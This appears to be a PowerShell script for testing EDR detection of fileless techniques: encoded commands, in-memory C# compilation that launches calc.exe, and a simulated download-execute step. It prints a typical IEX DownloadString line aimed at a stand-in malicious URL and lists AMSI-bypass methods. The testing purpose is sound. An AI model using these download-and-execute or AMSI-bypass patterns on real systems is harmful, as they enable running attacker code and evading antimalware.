# PowerShell Memory Execution Test - EDR Detection Test
#
# 목적: 메모리 상에서만 실행되는 파일리스 기법 테스트
# Purpose: Test EDR's ability to detect fileless PowerShell execution
#
# 탐지 포인트 (Detection Points):
# - PowerShell execution with encoded commands
# - In-memory .NET assembly loading
# - Reflection-based execution
# - Network download and execution without disk write
#
# WARNING: For testing purposes only in isolated environments

Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "    EDR Test: PowerShell Fileless Technique" -ForegroundColor Cyan
Write-Host "    WARNING: For testing purposes only!" -ForegroundColor Yellow
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host ""

# Test 1: Base64 Encoded Command Execution
Write-Host "[1] Testing Base64 Encoded Command Execution..." -ForegroundColor Green
Write-Host "    (Common technique to obfuscate malicious commands)" -ForegroundColor Gray

$command = "Write-Host 'This is a test command executed from memory'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

Write-Host "    Original Command: $command" -ForegroundColor Gray
Write-Host "    Encoded Command: $encodedCommand" -ForegroundColor Gray
Write-Host "[+] Base64 encoding demonstrated" -ForegroundColor Green

# Test 2: In-Memory Script Execution
Write-Host "`n[2] Testing In-Memory Script Execution..." -ForegroundColor Green
Write-Host "    (Script executed without touching disk)" -ForegroundColor Gray

$scriptBlock = {
    Write-Host "    Executing code from memory..." -ForegroundColor Yellow
    $proc = Get-Process | Select-Object -First 5 Name, Id
    Write-Host "    Sample processes:" -ForegroundColor Yellow
    $proc | ForEach-Object { Write-Host "      - $($_.Name) (PID: $($_.Id))" -ForegroundColor Gray }
}

Invoke-Command -ScriptBlock $scriptBlock
Write-Host "[+] In-memory execution demonstrated" -ForegroundColor Green

# Test 3: Reflection-based .NET Assembly Loading
Write-Host "`n[3] Testing Reflection-based Assembly Loading..." -ForegroundColor Green
Write-Host "    (Loading .NET code without file-based DLL)" -ForegroundColor Gray

# Simple C# code to compile in memory
$source = @"
using System;
using System.Diagnostics;

namespace MemoryTest {
    public class TestClass {
        public static void Execute() {
            Console.WriteLine("    [*] Executing .NET code from memory");
            Console.WriteLine("    [*] This demonstrates reflective loading");
            
            // Launch calc.exe as benign test
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "calc.exe";
            psi.WindowStyle = ProcessWindowStyle.Normal;
            
            Process proc = Process.Start(psi);
            Console.WriteLine("    [+] Calculator launched via .NET reflection (PID: " + proc.Id + ")");
            
            System.Threading.Thread.Sleep(2000);
            proc.Kill();
            Console.WriteLine("    [+] Process terminated");
        }
    }
}
"@

try {
    Add-Type -TypeDefinition $source -Language CSharp -ErrorAction Stop
    Write-Host "    [+] Assembly compiled in memory" -ForegroundColor Green
    
    # Execute the method
    [MemoryTest.TestClass]::Execute()
    
    Write-Host "[+] Reflection-based execution demonstrated" -ForegroundColor Green
} catch {
    Write-Host "    [-] Reflection test skipped (requires appropriate permissions)" -ForegroundColor Yellow
}

# Test 4: Simulated Download-Execute Pattern
Write-Host "`n[4] Testing Download-Execute Pattern (Simulated)..." -ForegroundColor Green
Write-Host "    (Common pattern: download script and execute without saving)" -ForegroundColor Gray

# Simulate what would happen with IEX (Invoke-Expression) from web
$simulatedWebContent = @"
# This simulates downloaded content
Write-Host '    [*] This would be downloaded from remote server' -ForegroundColor Yellow
Write-Host '    [*] Executed directly in memory via IEX' -ForegroundColor Yellow
Write-Host '    [*] Never written to disk' -ForegroundColor Yellow
"@

Write-Host "    Typical pattern:" -ForegroundColor Gray
Write-Host "      IEX (New-Object Net.WebClient).DownloadString('http://malicious.url/script.ps1')" -ForegroundColor DarkGray
Write-Host "    Executing simulated content:" -ForegroundColor Gray
Invoke-Expression $simulatedWebContent
Write-Host "[+] Download-execute pattern demonstrated" -ForegroundColor Green

# Test 5: AMSI Bypass Awareness
Write-Host "`n[5] AMSI (Antimalware Scan Interface) Detection Test..." -ForegroundColor Green
Write-Host "    (EDR should detect AMSI bypass attempts)" -ForegroundColor Gray

$amsiTest = @"
# Common AMSI bypass patterns that EDR should detect:
# - Setting AMSI context to null
# - Patching amsi.dll in memory
# - Using reflection to disable AMSI
# - Obfuscated AMSI disable commands
"@

Write-Host $amsiTest -ForegroundColor DarkGray
Write-Host "[+] AMSI awareness demonstrated (not bypassing)" -ForegroundColor Green

# Summary
Write-Host "`n==================================================" -ForegroundColor Cyan
Write-Host "EDR Detection Points for Fileless PowerShell:" -ForegroundColor Cyan
Write-Host "==================================================" -ForegroundColor Cyan
Write-Host "  - PowerShell.exe execution monitoring" -ForegroundColor White
Write-Host "  - Base64 encoded command usage" -ForegroundColor White
Write-Host "  - Script block logging" -ForegroundColor White
Write-Host "  - Invoke-Expression (IEX) calls" -ForegroundColor White
Write-Host "  - Add-Type and in-memory compilation" -ForegroundColor White
Write-Host "  - Reflection-based assembly loading" -ForegroundColor White
Write-Host "  - Network connections from PowerShell" -ForegroundColor White
Write-Host "  - AMSI (Antimalware Scan Interface) integration" -ForegroundColor White
Write-Host "  - Process creation from PowerShell" -ForegroundColor White
Write-Host "  - Unsigned script execution" -ForegroundColor White
Write-Host "`n[+] Test completed successfully!" -ForegroundColor Green
